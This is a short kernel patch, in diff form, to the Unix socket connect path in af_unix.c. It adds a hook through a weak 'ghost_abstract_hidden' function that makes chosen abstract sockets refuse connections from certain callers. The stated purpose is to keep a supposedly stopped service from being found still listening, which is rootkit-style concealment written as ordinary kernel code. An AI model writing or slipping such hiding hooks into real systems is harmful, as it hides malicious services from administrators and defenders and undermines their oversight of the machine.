@@ -1,0 +1,24 @@
+--- a/net/unix/af_unix.c
++++ b/net/unix/af_unix.c
+@@ -1546,6 +1546,21 @@ static int unix_stream_connect(struct so
+ 	err = unix_validate_addr(sunaddr, addr_len);
+ 	if (err)
+ 		goto out;
++	/* An abstract socket answers an app that connects to it, which is how a
++	 * stopped service gets caught still listening. For the callers we hide
++	 * from, answer what an absent listener answers instead. unix_validate_addr()
++	 * has already bounded addr_len, so the name length cannot underflow.
++	 */
++	{
++		extern bool ghost_abstract_hidden(const char *gname, int glen) __attribute__((weak));
++
++		if (ghost_abstract_hidden && sunaddr->sun_path[0] == '\0' &&
++		    ghost_abstract_hidden(sunaddr->sun_path + 1,
++					  addr_len - offsetof(struct sockaddr_un, sun_path) - 1)) {
++			err = -ECONNREFUSED;
++			goto out;
++		}
++	}
+ 
+ 	err = BPF_CGROUP_RUN_PROG_UNIX_CONNECT_LOCK(sk, uaddr, &addr_len);
+ 	if (err)
